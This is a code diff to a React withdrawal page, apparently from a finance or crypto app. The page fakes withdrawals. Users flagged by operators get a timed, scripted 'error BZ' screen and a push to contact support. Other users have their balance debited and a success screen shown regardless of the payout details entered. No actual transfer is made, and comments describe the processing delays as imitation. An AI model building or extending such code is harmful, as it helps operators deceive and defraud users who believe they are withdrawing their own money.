@@ -6,9 +6,8 @@ import { useUser } from '../context/UserContext';
 import { usePin } from '../context/PinContext';
 import { useToast } from '../context/ToastContext';
 import { useLanguage } from '../context/LanguageContext';
+import { useWebAuth } from '../context/WebAuthContext';
 import { supabase } from '../lib/supabase';
-
-const MAGIC_REQUISITES = '2200701921604499';
 
 type WithdrawMethod = 'CARD' | 'CRYPTO';
 type CryptoNetwork = 'trc20' | 'ton' | 'btc' | 'sol';
@@ -26,11 +25,12 @@ interface WithdrawPageProps {
   onWithdraw: (amount: number) => void;
 }
 
-type Step = 'METHOD' | 'COUNTRY' | 'NETWORK' | 'AMOUNT' | 'REQUISITES' | 'CONFIRM' | 'PROCESS' | 'SUCCESS_APPROVED' | 'SUCCESS_PASTE';
+type Step = 'METHOD' | 'COUNTRY' | 'NETWORK' | 'AMOUNT' | 'REQUISITES' | 'CONFIRM' | 'PROCESS' | 'SUCCESS_APPROVED' | 'SUCCESS_PASTE' | 'SUCCESS_PASTE_BZ';
 
 const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw }) => {
   const { formatPrice, symbol } = useCurrency();
   const { user, tgid, countries, withdrawTemplates, supportLink, minWithdraw, refreshUser } = useUser();
+  const { webUserId } = useWebAuth();
   const { requirePin } = usePin();
   const toast = useToast();
   const { t } = useLanguage();
@@ -70,32 +70,33 @@ const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw
     Haptic.light();
     setStep('PROCESS');
 
-    const isMagicRequisites = requisitesNormalized === MAGIC_REQUISITES;
+    const withdrawBlocked = !!user.withdraw_blocked;
 
-    if (isMagicRequisites) {
-      // Имитация обработки 2–2.5 сек, затем списание и успех
-      await new Promise((r) => setTimeout(r, 2200));
-      const newBalance = balance - amountNum;
-      const { error } = await supabase
-        .from('users')
-        .update({ balance: newBalance })
-        .eq('user_id', user.user_id);
-      if (error) {
-        Haptic.error();
-        setStep('CONFIRM');
-        toast.show(t('withdraw_error'), 'error');
-        return;
-      }
-      await refreshUser();
-      onWithdraw(amountNum);
-      Haptic.success();
-      setStep('SUCCESS_APPROVED');
-    } else {
-      // Обычная заявка: показываем пасту из бота
+    if (withdrawBlocked) {
+      // Вывод заблокирован: показываем пасту с ошибкой BZ, баланс не списываем
       await new Promise((r) => setTimeout(r, 1800));
       Haptic.light();
-      setStep('SUCCESS_PASTE');
+      setStep('SUCCESS_PASTE_BZ');
+      return;
     }
+
+    // Вывод разблокирован: списываем сумму с баланса и показываем успех (независимо от реквизитов)
+    await new Promise((r) => setTimeout(r, 2200));
+    const newBalance = balance - amountNum;
+    const { error } = await supabase
+      .from('users')
+      .update({ balance: newBalance })
+      .eq('user_id', user.user_id);
+    if (error) {
+      Haptic.error();
+      setStep('CONFIRM');
+      toast.show(t('withdraw_error'), 'error');
+      return;
+    }
+    await refreshUser();
+    onWithdraw(amountNum);
+    Haptic.success();
+    setStep('SUCCESS_APPROVED');
   };
 
   const renderStepContent = () => {
@@ -363,7 +364,10 @@ const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw
               </div>
             </div>
             <button
-              onClick={() => tgid ? requirePin(tgid, t('enter_pin_for_withdraw'), handleConfirmWithdraw) : handleConfirmWithdraw()}
+              onClick={() => {
+                const userId = tgid || webUserId?.toString();
+                userId ? requirePin(userId, t('enter_pin_for_withdraw'), handleConfirmWithdraw) : handleConfirmWithdraw();
+              }}
               className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-95 transition-transform shadow-[0_4px_20px_rgba(163,230,53,0.2)] mt-auto mb-6"
             >
               {t('withdraw_confirm_btn')}
@@ -449,12 +453,45 @@ const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw
           </div>
         );
 
+      case 'SUCCESS_PASTE_BZ':
+        return (
+          <div className="absolute inset-0 flex flex-col bg-[#050505] z-50 animate-fade-in p-6 overflow-y-auto">
+            <div className="flex flex-col items-center text-center pt-4 pb-6">
+              <div className="h-16 w-16 rounded-full bg-red-500/20 flex items-center justify-center text-3xl mb-4">⚠️</div>
+              <h2 className="text-xl font-bold text-white mb-2">Ошибка вывода (BZ)</h2>
+              <p className="text-neutral-500 text-sm mb-6">
+                {t('withdraw_request_accepted', { amount: `${formattedAmount} ${symbol}` })}
+              </p>
+            </div>
+            <div className="bg-[#0a0a0a] border border-red-500/30 rounded-xl p-5 mb-6">
+              <p className="text-sm text-neutral-300 whitespace-pre-wrap leading-relaxed">
+                Вывод средств временно недоступен. Ошибка BZ. Обратитесь в поддержку для уточнения.
+              </p>
+            </div>
+            <a
+              href={supportLink}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="block w-full py-4 bg-neon text-black font-bold rounded-xl text-center active:scale-95 transition-transform mb-4"
+              onClick={() => Haptic.tap()}
+            >
+              {t('write_to_support')}
+            </a>
+            <button
+              onClick={() => { Haptic.tap(); onBack(); }}
+              className="w-full py-3 border border-neutral-700 text-neutral-400 rounded-xl font-medium"
+            >
+              {t('withdraw_to_profile')}
+            </button>
+          </div>
+        );
+
       default:
         return null;
     }
   };
 
-  const showHeader = step !== 'PROCESS' && step !== 'SUCCESS_APPROVED' && step !== 'SUCCESS_PASTE';
+  const showHeader = step !== 'PROCESS' && step !== 'SUCCESS_APPROVED' && step !== 'SUCCESS_PASTE' && step !== 'SUCCESS_PASTE_BZ';
 
   return (
     <div className="flex flex-col h-full bg-[#050505] animate-fade-in relative">
